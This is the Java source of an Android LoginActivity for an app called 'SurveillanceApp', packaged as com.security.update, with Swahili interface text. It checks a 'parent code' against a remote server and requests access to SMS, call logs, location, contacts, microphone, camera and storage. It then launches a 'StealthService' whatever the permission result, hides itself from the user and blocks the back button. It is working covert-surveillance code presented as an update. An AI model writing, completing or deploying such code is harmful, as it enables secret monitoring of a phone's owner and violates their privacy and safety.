package com.security.update;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make window stealthy - no title, no status bar
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_login);
        
        // Check if already logged in
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        
        if (!savedCode.isEmpty() && isVerified) {
            // Already have verified code, go to stealth mode directly
            startStealthMode(savedCode);
            return;
        }
        
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        
        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            
            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (code.length() != 8) {
                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Verify code with GhostTester server - STRICT VERIFICATION
            verifyParentCode(code);
        });
    }
    
    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                // Server URL - GHOST TESTER SERVER
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                
                // Create JSON request
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);
                
                // Send verification request to server
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                // Send request
                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();
                
                // Get response
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean isValid = jsonResponse.getBoolean("valid");
                    
                    runOnUiThread(() -> {
                        if (isValid) {
                            String parentName = jsonResponse.optString("parent_name", "Mzazi");
                            String childPhone = jsonResponse.optString("child_phone", "Hakuna namba");
                            saveCodeAndRequestPermissions(code, parentName, childPhone);
                        } else {
                            String error = jsonResponse.optString("error", "Parent code si sahihi!");
                            Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
                            codeInput.setText("");
                        }
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao! Code: " + responseCode, Toast.LENGTH_LONG).show();
                        codeInput.setText("");
                    });
                }
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    Toast.makeText(this, "❌ Hitilafu: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    codeInput.setText("");
                });
            }
        }).start();
    }
    
    private void saveCodeAndRequestPermissions(String code, String parentName, String childPhone) {
        // Save code first
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putString("parent_name", parentName);
        editor.putString("child_phone", childPhone);
        editor.putBoolean("code_verified", true);
        editor.apply();
        
        // Request all permissions
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            // For older versions, start stealth mode directly
            startStealthMode(prefs.getString("parent_code", ""));
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "✅ Permissions zote zimekubaliwa! Stealth mode inaanza...", Toast.LENGTH_LONG).show();
                startStealthMode(prefs.getString("parent_code", ""));
            } else {
                Toast.makeText(this, "⚠️ Baadhi ya permissions hazijakubaliwa. App haitafanya kazi vizuri.", Toast.LENGTH_LONG).show();
                startStealthMode(prefs.getString("parent_code", ""));
            }
        }
    }
    
    private void startStealthMode(String code) {
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);
        
        // Hide app completely
        moveTaskToBack(true);
        finish();
    }
    
    @Override
    public void onBackPressed() {
        // Prevent going back - force user to enter code
        moveTaskToBack(true);
    }
}
